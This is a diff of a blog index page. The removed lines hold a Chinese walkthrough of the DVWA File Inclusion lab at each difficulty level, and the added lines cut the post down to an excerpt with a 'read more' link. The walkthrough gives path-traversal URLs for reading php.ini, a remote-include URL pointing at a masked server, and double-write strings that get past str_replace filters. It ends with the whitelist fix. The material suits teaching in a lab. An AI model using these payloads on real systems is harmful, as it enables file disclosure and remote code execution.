@@ -290,44 +290,9 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>参考链接:<a href="http://www.freebuf.com/articles/web/119150.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/119150.html</a></p>
-<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>文件包含漏洞是”代码注入”的一种。”代码注入”这种攻击，其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。”代码注入”的典型代表就是文件包含(File Inclusion)。文件包含可能会出现在JSP,PHP,ASP等语言中。<br><br>在PHP中主要有四个函数:<br></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行</span><br><span class="line"></span><br><span class="line">require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本</span><br><span class="line"></span><br><span class="line">include_once()和require_once()：若文件中代码已被包含则不会再次包含</span><br></pre></td></tr></table></figure>
-<p>文件包含漏洞又分为两部分:本地文件包含和远程文件包含</p>
-<h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><p>服务端核心代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file=$_GET[&apos;page&apos;];</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p>
-<p>需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
-<h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">能够打开并包含本地文件的漏洞，被称为本地文件包含漏洞(Local File Inclusion,简称LFI)</span><br></pre></td></tr></table></figure>
-<p><img src="http://p1vrkwaxt.bkt.clouddn.com/DGYZK%60Y1%252H%5BW_UQ%60M0R87H.png" alt="image"></p>
-<ul>
-<li>随意构造?page=2333333,发现错误报告（开了错误提示为前提)<br><img src="http://p1vrkwaxt.bkt.clouddn.com/R3IQE%6090WIU$%7DWI4Y4JA6W0.png" alt="image"><br>虽然Windows不能直接获取文件，但是给出的错误信息中爆出了绝对路径D:\appserv\www\DVWA-master\<br><br>构造url(绝对路径)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/DVWA-master/vulnerabilities/fi/?page=D:\appserv\www\DVWA-master\php.ini</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>得到php.ini的信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; This file attempts to overwrite the original php.ini file. Doesnt always work. magic_quotes_gpc = Off allow_url_fopen = On allow_url_include = On</span><br></pre></td></tr></table></figure></p>
-<p>构造url(相对路径)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/DVWA-master/vulnerabilities/fi/?page=../../../../../../../../appserv/www/DVWA-master/php.ini</span><br></pre></td></tr></table></figure></p>
-<p>这里加多次../是为了可以保证回到根目录</p>
-<h2 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h2><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p>
-<p>这里需要一个服务器(我这里不放出真正的ip)<br><br>在远程服务器xxx.xxx.x.xx上传一个1.php文件，内容为hello.<br><br>构造url<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/DVWA-master/vulnerabilities/fi/?page=http://xxx.xxx.x.xx/1.php</span><br></pre></td></tr></table></figure></p>
-<p>可以看到页面输出hello</p>
-<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>服务端核心代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &apos;page&apos; ];</span><br><span class="line"></span><br><span class="line">// Input validation</span><br><span class="line">$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );</span><br><span class="line">$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>可以看出同样是str_repalce函数。可以采用双写绕过替换规则<br></p>
-<ul>
-<li>第一个的http://与https://主要针对远程服务器的，可采用如下格式:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/DVWA-master/vulnerabilities/fi/?page=hthttp://tp://xxx.xxx.x.xx/1.php</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>str_replace函数会将http://替换成空白，从而成功执行远程命令</p>
-<ul>
-<li>第二的../与../也同样可以用双写规则绕过，不过对绝对路径的方式包含文件没有影响<br></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/dvwa/vulnerabilities/fi/?page=..././..././..././..././..././..././..././..././..././appserv/www/DVWA/php.ini</span><br></pre></td></tr></table></figure>
-<p><img src="http://p1vrkwaxt.bkt.clouddn.com/%7B1UPIDGVT0%7BHQ%7D_~%29R3%28LTV.png" alt="image"><br>成功爆出php.ini的信息</p>
-<h2 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h2><p>服务端核心代码:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">File Inclusion Source</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &apos;page&apos; ];</span><br><span class="line"></span><br><span class="line">// Input validation</span><br><span class="line">if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123;</span><br><span class="line">    // This isn&apos;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>High级别使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p>
-<p>High级别的代码规定只能包含file开头的文件，不过我们依然可以利用file协议绕过</p>
-<p><img src="http://p1vrkwaxt.bkt.clouddn.com/6W_FPG3~1N$%2963V$03%7D%7BSOB.png" alt="image"></p>
-<p>成功读取服务器的配置文件</p>
-<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>服务器端核心代码<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">  </span><br><span class="line">// The page we wish to display  </span><br><span class="line">$file = $_GET[ &apos;page&apos; ];  </span><br><span class="line">  </span><br><span class="line">// Only allow include.php or file&#123;1..3&#125;.php  </span><br><span class="line">if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123;  </span><br><span class="line">    // This isn&apos;t the page we want!  </span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;  </span><br><span class="line">    exit;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>可以看到，Impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。</p>
-
+              <p>参考链接:<a href="http://www.freebuf.com/articles/web/119150.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/119150.html</a></p>
+<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>文件包含漏洞是”代码注入”的一种。”代码注入”这种攻击，其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。”代码注入”的典型代表就是文件包含(File Inclusion)<br>
+          
       
     </div>
     
@@ -336,6 +301,10 @@
       
 
       
+      
+        <p class="article-more-link">
+          <a   href="/2018/07/06/DVWA之File Inclusion/#more">查看更多 >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -694,7 +663,7 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-              <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1>
+              <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="0x01-比较数字大小"><a href="#0x01-比较数字大小" class="headerlink" title="0x01 比较数字大小"></a>0x01 比较数字大小</h2>
           
       
     </div>
